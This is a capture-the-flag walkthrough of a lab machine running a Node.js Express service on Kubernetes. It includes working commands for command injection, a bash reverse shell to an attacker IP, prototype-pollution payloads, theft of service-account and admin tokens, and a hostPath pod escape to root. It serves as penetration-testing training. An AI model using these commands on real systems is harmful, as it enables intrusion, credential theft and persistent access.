# Unobtainium

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.136.226
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-28 08:04 EST
Nmap scan report for 10.129.136.226
Host is up (0.0073s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8443/tcp  open  https-alt
10250/tcp open  unknown
10251/tcp open  unknown
31337/tcp open  Elite
```

There are some interesting ports that are open on this machine. We can do a detailed scan for better clarity (output has been truncated).

<pre><code><strong>$ sudo nmap -p 22,80,8443,10250,10251,31337 -sC -sV -O -T4 10.129.136.226
</strong>Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-28 08:05 EST
Nmap scan report for 10.129.136.226
Host is up (0.0071s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http          Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
8443/tcp  open  ssl/https-alt
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| ssl-cert: Subject: commonName=k3s/organizationName=k3s
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, DNS:unobtainium, IP Address:10.129.136.226, IP Address:10.43.0.1, IP Address:127.0.0.1
10250/tcp open  ssl/http      Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:unobtainium, DNS:localhost, IP Address:127.0.0.1, IP Address:10.129.136.226
| Not valid before: 2022-08-29T09:26:11
|_Not valid after:  2024-01-28T13:02:51
10251/tcp open  unknown
31337/tcp open  http          Node.js Express framework
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8)
</code></pre>

### Port 80 & 8443

Visting the web page shows us this:

<figure><img src="../../../.gitbook/assets/image (2744).png" alt=""><figcaption></figcaption></figure>

When any of the links are clicked, we can download a zip file for an application. Not too sure what we can do with this at the moment.

We can see from the `nmap` scan above that there is some kind of Kubernetes application being run on port 8443. When trying to view it, all we get is a 401 Unauthorized error from the API.

<figure><img src="../../../.gitbook/assets/image (3250).png" alt=""><figcaption></figcaption></figure>

### Deb File Analysis

I downloaded the `deb` version of the application and unzipped it to find a few items:

```
$ ls
unobtainium_1.0.0_amd64.deb  unobtainium_1.0.0_amd64.deb.md5sum
```

With the `ar x` command, we can decompile the `deb` file. We would get a few more files:

```
$ ls
control.tar.gz  debian-binary                unobtainium_1.0.0_amd64.deb.md5sum
data.tar.xz     unobtainium_1.0.0_amd64.deb  unobtainium_debian.zip
```

We can first use `gunzip` and `tar` to extract the `control.tar.gz` files. Within it, we can find a few other files.

<figure><img src="../../../.gitbook/assets/image (2905).png" alt=""><figcaption></figcaption></figure>

Interesting. We can take a look at the content within these folders.

{% code title="control" %}
```
$ cat control
Package: unobtainium
Version: 1.0.0
License: ISC
Vendor: felamos <felamos@unobtainium.htb>
Architecture: amd64
Maintainer: felamos <felamos@unobtainium.htb>
Installed-Size: 185617
Depends: libgtk-3-0, libnotify4, libnss3, libxss1, libxtst6, xdg-utils, libatspi2.0-0, libuuid1, libappindicator3-1, libsecret-1-0
Section: default
Priority: extra
Homepage: http://unobtainium.htb
Description: 
  client
```
{% endcode %}

Seems that there is a user named `felamos` and this is some metadata of the program. The other files are bash scripts. The `postinst` file contained some hints about Electron 5+.

```bash
$ cat postinst 
#!/bin/bash

# Link to the binary
ln -sf '/opt/unobtainium/unobtainium' '/usr/bin/unobtainium'

# SUID chrome-sandbox for Electron 5+
chmod 4755 '/opt/unobtainium/chrome-sandbox' || true

update-mime-database /usr/share/mime || true
update-desktop-database /usr/share/applications || true
```

The other bash scripts was just a file to remove the binary.

```bash
$ cat postrm  
#!/bin/bash

# Delete the link to the binary
rm -f '/usr/bin/unobtainium'
```

Using `xz -d` and `tar xvf` on the `data.tar.xz` file revealed lots of files pertaining to the application.

<figure><img src="../../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>

Amongst all the files mentioned, it appears that the source code was within the `./opt/unobtainium/resources/app.asar` directory of the folder. We can decompile this file using `npx asar`.

<figure><img src="../../../.gitbook/assets/image (2530).png" alt=""><figcaption></figcaption></figure>

Then, we can begin our source code analysis

### Source Code Analysis

It appears that this is the code for the application running on port 31337 of the machine. We can analyse `/src/js/app.js` to find this hint. We can also find a set of credentials.&#x20;

```javascript
$(document).ready(function(){
    $("#but_submit").click(function(){
        var message = $("#message").val().trim();
        $.ajax({
        url: 'http://unobtainium.htb:31337/',
        type: 'put',
        dataType:'json',
        contentType:'application/json',
        processData: false,
        data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"text": message}}),
        success: function(data) {
            //$("#output").html(JSON.stringify(data));
            $("#output").html("Message has been sent!");
        }
    });
});
});
```

There was also another `todo.js` file that had a similar set of code within it.

```javascript
$.ajax({
    url: 'http://unobtainium.htb:31337/todo',
    type: 'post',
    dataType:'json',
    contentType:'application/json',
    processData: false,
    data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"}),
    success: function(data) {
        $("#output").html(JSON.stringify(data));
    }
});
```

We can test the connection to this server by sending a POST request as follows:

```http
POST /todo HTTP/1.1
Host: 10.129.136.226:31337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 80

{
    "auth": 
    {"name": "felamos", 
     "password": "Winter2021"
    }, 
    "filename" : "todo.txt"
}
# OR use curl
$ curl -H "Content-Type: application/json" -X POST -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"}' http://10.129.136.226:31337/todo
{"ok":true,"content":"1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n"}
```

We would be able to see that there's an obvious LFI present in the `filename` parameter. However, attempting to access anything beyond the local folder results in a hang. Perhaps there was another hidden file preventing access to other directories.

Anyways, I took a look at the `index.js` file by varying the `filename` parameter in the JSON data. This revealed some hidden code for me to read.

### Finding RCE

Let's break this file down slowly. It starts off with the imports, and straightaway we can notice the `child_process` being used with `exec`, meaning there's some RCE to do here.

```javascript
var root = require(\"google-cloudstorage-commands\");
const express = require('express');
const { exec } = require(\"child_process\");
const bodyParser = require('body-parser');
const _ = require('lodash');
const app = express();
var fs = require('fs');
```

Then, there's further mention of the user and his credentials, as well as an `admin`. There was an `auth` function as well, and it uses `===`. Seems like guessing the `admin` password is not the way to go here.&#x20;

```javascript
const users = [
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      
];

function findUser(auth) {
  return users.find((u) =>
    u.name === auth.name &&
    u.password === auth.password);
}
```

We can find the code used for the `/todo` endpoint:

```javascript
app.post('/todo', (req, res) => {
        const user = findUser(req.body.auth || {});
        if (!user) {
                res.status(403).send({ok: false, error: 'Access denied'});
                return;
        }
        filename = req.body.filename;
        testFolder = \"/usr/src/app\";
        fs.readdirSync(testFolder).forEach(file => {
                if (file.indexOf(filename) > -1) {
                        var buffer = fs.readFileSync(filename).toString();
                        res.send({ok: true, content: buffer});
                }
        });
    });
```

We were able to use this earlier, meaning that we passed the `!user` check. Now, we can take a look at the code for an `/upload` function.

```javascript
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }
  filename = req.body.filename;
  root.upload(\"./\",filename, true);
  res.send({ok: true, Uploaded_File: filename});
});
```

The function used here is `root.upload`, which was taken from the `google-cloudstorage-commands` imported earlier. When researching for exploits regarding this package, there are some RCE exploits that pop up.

{% embed url="https://security.snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431" %}

In short, we need to execute this on the server: `root.upload("./","& touch JHU", true);`.  This is trivial by altering the filename.

However, there's a small problem as we aren't allowed to upload with the credentials of felamos.

```
$ curl -H "Content-Type: application/json" -X POST -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "index.js"}' http://10.129.136.226:31337/upload
{"ok":false,"error":"Access denied"} 
```

This means we need to take a look at how the application authenticates its users / stores data about the `user.canUpload` check.

### Prototype Pollution

Looking at the rest of the file, we can see that there's a PUT method allowed on the machine.

```javascript
app.put('/', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }
  const message = {
    icon: '__',
  };
  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });
  messages.push(message);
  res.send({ok: true});
});
```

The main thing to take note of is the usage of `merge`, which is used unsafely because it does not verify the contents of `message`. This means that the application is vulnerable to prototype pollution, which would allow us to change certain attributes of our object. In this case, the object is the user `felamos`.

So to craft our exploit, we need to find out what information the JSON object must have. Based on `app.js` found earlier, we know that we need a `"message":{"text':message}}"` JSON. Afterwards, we can include the `__proto__` portion.

The final request I sent looked like this:

<figure><img src="../../../.gitbook/assets/image (3236).png" alt=""><figcaption></figcaption></figure>

Afterwards, I was able to upload files to the server:

```
$ curl -H "Content-Type: application/json" -X POST -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "index.js"}' http://10.129.136.226:31337/upload
{"ok":true,"Uploaded_File":"index.js"}
```

Then, we can simply get a reverse shell by changing the `filename` parameter.

```
$ curl -H "Content-Type: application/json" -X POST -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "& bash -c \"bash -i >& /dev/tcp/10.10.14.17/443 0>&1\""}' http://10.129.136.226:31337/upload
{"ok":true,"Uploaded_File":"& bash -c \"bash -i >& /dev/tcp/10.10.14.17/443 0>&1\""}
```

<figure><img src="../../../.gitbook/assets/image (3471).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Very obviously, we were in some kind of container. Remember the kubernetes API that we found a lot earlier? Perhaps that was the container escape vector.

### Kubernetes Enumeration

I found this page rather useful.

{% embed url="https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting/kubernetes-enumeration" %}

It appears that we can get a token from the `/run/secrets/kubernetes.io/serviceaccount` folder to interact with the API. Within that file, we can find a `ca.crt` and `token` file.

<figure><img src="../../../.gitbook/assets/image (406).png" alt=""><figcaption></figcaption></figure>

Using this in conjunction with `kubectl` reveals that we can indeed talk to the API.

```
$ kubectl --server https://10.129.136.226:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6InRqSFZ0OThnZENVcDh4SXltTGhfU0hEX3A2UXBhMG03X2pxUVYtMHlrY2cifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzA2NDQ5ODg5LCJpYXQiOjE2NzQ5MTM4ODksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJ3ZWJhcHAtZGVwbG95bWVudC05NTQ2YmM3Y2ItYjdrMmciLCJ1aWQiOiIyMjA4Mzc5Yi0yY2U2LTQ0YjktYjlhOC1hOWU3N2Q1NTIwYTEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiJhOGQ5YjRkNC1iZDhjLTQyNDEtOTcxMC0zOGZkNzg5ZjYwYmUifSwid2FybmFmdGVyIjoxNjc0OTE3NDk2fSwibmJmIjoxNjc0OTEzODg5LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpkZWZhdWx0In0.nIY2J9lwK7XMWA8GBMvCMt7VqZXlcJf4R-QxUFKjRh6eiWO1yfF64ETLhiGI62AuMQ0tea-om4uHh2QQ9txgxb_XW6Ii4bI_wL_6RVVZbEfIVDVffwSTdquR3kt20V6omeOwk5W69oXbTOJeQXy7ULLCsmmzDvhr1k3NfJHuoadwpIB31nD3dLC3GTJZuEcO1U3ceuCctgnFUqQbhDRjlKhr3sAtviyZcRj00vH68o6xN2Ufgks57Oc54_4cIkCQ-7Q_l0yQOl2uI0IYA-pEaCVn2rnVOCcdjCWDPEZ7P8CUtvHElDcVpPk4pQikBygtHPQNgXIXMH7J-1gxnwNv_A get pod
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" in the namespace "default"
```

Now, although we did not get any information, it confirms that this set of credentials are required to communicate with the API (which would have returned 401 Unauthorized anyways). We can just `auth can-i --list` to view our permissions

```
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

It appears that we can enumerate the namespaces hosted on the server.

```
NAME              STATUS   AGE
default           Active   152d
kube-system       Active   152d
kube-public       Active   152d
kube-node-lease   Active   152d
dev               Active   152d
```

The `dev` one was the most interesting. We can attempt to enumerate what was running within that namespace. This can be done by appending `-n dev get pods` to our command.

```
NAME                                  READY   STATUS    RESTARTS       AGE
devnode-deployment-776dbcf7d6-sr6vj   1/1     Running   3 (152d ago)   152d
devnode-deployment-776dbcf7d6-g4659   1/1     Running   3 (152d ago)   152d
devnode-deployment-776dbcf7d6-7gjgf   1/1     Running   3 (152d ago)   152d
```

It seems that there are 3 pods running. We can enumerate the IP addresses of what's running by appending `-n dev get pods -o custom-columns=NAME:metadata.name,IP:status.podIP`.

```
NAME                                  IP
devnode-deployment-776dbcf7d6-sr6vj   10.42.0.39
devnode-deployment-776dbcf7d6-g4659   10.42.0.38
devnode-deployment-776dbcf7d6-7gjgf   10.42.0.40
```

When checking the IP address of the pod I had a shell on, it was running on 10.42.0.41. Perhaps the other pods were accessible from that machine? I wanted to enumerate these machines more.&#x20;

### Container Escape

I downloaded an `nmap` binary to the machine we had access to and scanned the first 10000 ports of these 3 containers. The scan for 10.42.0.38 revealed that port 3000 was open on this machine.

```
# nmap -p- --min-rate 10000 10.42.0.38
Nmap scan report for 10.42.0.38
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000014s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3000/tcp open  unknown
MAC Address: 6A:95:CB:8C:AB:5F (Unknown)
```

Port 3000 is the default port where Express applications run on. Earlier, in our source code review, the application was found to be running on Express. I repeated the Prototype Pollution and RCE exploit I used earlier, and was able to receive a shell to the devnode.

<figure><img src="../../../.gitbook/assets/image (2022).png" alt=""><figcaption></figcaption></figure>

### Namespace Enumeration

Now, within this new container, there was another token and ca.crt to be downloaded. Perhaps I would have new permissions with these.&#x20;

When checking the `auth can-i` for all the namespaces, the `kube-system` one revealed something new.

```
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]

```

We had access to some `secrets`. Here's the output from `get secrets`.

```
NAME                                                 TYPE                                  DATA   AGE
k3s-serving                                          kubernetes.io/tls                     2      152d
unobtainium.node-password.k3s                        Opaque                                1      152d
horizontal-pod-autoscaler-token-2fg27                kubernetes.io/service-account-token   3      152d
coredns-token-jx62b                                  kubernetes.io/service-account-token   3      152d
local-path-provisioner-service-account-token-2tk2q   kubernetes.io/service-account-token   3      152d
statefulset-controller-token-b25sg                   kubernetes.io/service-account-token   3      152d
certificate-controller-token-98jdq                   kubernetes.io/service-account-token   3      152d
root-ca-cert-publisher-token-t564t                   kubernetes.io/service-account-token   3      152d
ephemeral-volume-controller-token-brb5h              kubernetes.io/service-account-token   3      152d
ttl-after-finished-controller-token-wf8k9            kubernetes.io/service-account-token   3      152d
replication-controller-token-9m8mh                   kubernetes.io/service-account-token   3      152d
service-account-controller-token-6vsl2               kubernetes.io/service-account-token   3      152d
node-controller-token-dfztj                          kubernetes.io/service-account-token   3      152d
metrics-server-token-d4k84                           kubernetes.io/service-account-token   3      152d
pvc-protection-controller-token-btkqg                kubernetes.io/service-account-token   3      152d
pv-protection-controller-token-k8gq8                 kubernetes.io/service-account-token   3      152d
endpoint-controller-token-zd5b9                      kubernetes.io/service-account-token   3      152d
disruption-controller-token-cnqj8                    kubernetes.io/service-account-token   3      152d
cronjob-controller-token-csxvj                       kubernetes.io/service-account-token   3      152d
endpointslice-controller-token-wrnvm                 kubernetes.io/service-account-token   3      152d
pod-garbage-collector-token-56dzk                    kubernetes.io/service-account-token   3      152d
namespace-controller-token-g8jmq                     kubernetes.io/service-account-token   3      152d
daemon-set-controller-token-b68xx                    kubernetes.io/service-account-token   3      152d
replicaset-controller-token-7fkxv                    kubernetes.io/service-account-token   3      152d
job-controller-token-xctqc                           kubernetes.io/service-account-token   3      152d
ttl-controller-token-rsshv                           kubernetes.io/service-account-token   3      152d
deployment-controller-token-npk6k                    kubernetes.io/service-account-token   3      152d
attachdetach-controller-token-xvj9h                  kubernetes.io/service-account-token   3      152d
endpointslicemirroring-controller-token-b5r69        kubernetes.io/service-account-token   3      152d
resourcequota-controller-token-8pp4p                 kubernetes.io/service-account-token   3      152d
generic-garbage-collector-token-5nkzj                kubernetes.io/service-account-token   3      152d
persistent-volume-binder-token-865v2                 kubernetes.io/service-account-token   3      152d
expand-controller-token-f2csp                        kubernetes.io/service-account-token   3      152d
clusterrole-aggregation-controller-token-wp8k6       kubernetes.io/service-account-token   3      152d
default-token-h5tf2                                  kubernetes.io/service-account-token   3      152d
c-admin-token-b47f7                                  kubernetes.io/service-account-token   3      152d
```

From this, we can retrieve the administrator token to become the admin on the Kubernetes API. We can use `describe secret -n kube-system c-admin-token-b47f7` to retrieve the token. Using this token, we can do **all commands**.

```
$ kubectl --server https://10.129.136.226:8443 --certificate-authority=ca.crt --token=$(cat admin_token) auth can-i --list -n kube-system    
Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []
```

### Pod Escape

As the administrator, one attack path we can do is to create a new pod that has root access to the file system and connect to it. This article is very useful in telling us how.&#x20;

{% embed url="https://infosecwriteups.com/kubernetes-container-escape-with-hostpath-mounts-d1b86bd2fa3" %}

Essentially, we need to create a YAML file that has specifications on how our new pod would be like, and it's there that we can include the mount path. First, we need to find the images available on the machine. This c an be done with some basic commands.

<figure><img src="../../../.gitbook/assets/image (3985).png" alt=""><figcaption></figcaption></figure>

At the very bottom, we can find and use `localhost:5000/dev-alpine`. Then we can create our YAML file and then a new pod with custom settings.&#x20;

Here's my YAML file:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: node
  namespace: kube-system
spec:
  containers:  
  - name: pepod
    image: localhost:5000/node_server
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

<figure><img src="../../../.gitbook/assets/image (2032).png" alt=""><figcaption></figcaption></figure>

Then we can connect to it directly using this command:

```
$ kubectl exec node --stdin --tty -n kube-system --token $(cat admin_token) --server https://10.129.136.226:8443 --certificate-authority ca.crt -- /bin/sh
# whoami
root
```

Then we can capture the root flag. Afterwards, we can easily upgrade a shell into this machine. We can create an `authorized_keys` file and echo our public key in it.&#x20;

<figure><img src="../../../.gitbook/assets/image (2770).png" alt=""><figcaption></figcaption></figure>

Rooted! Really good machine for learning source code analysis and Kubernetes enumerations.&#x20;
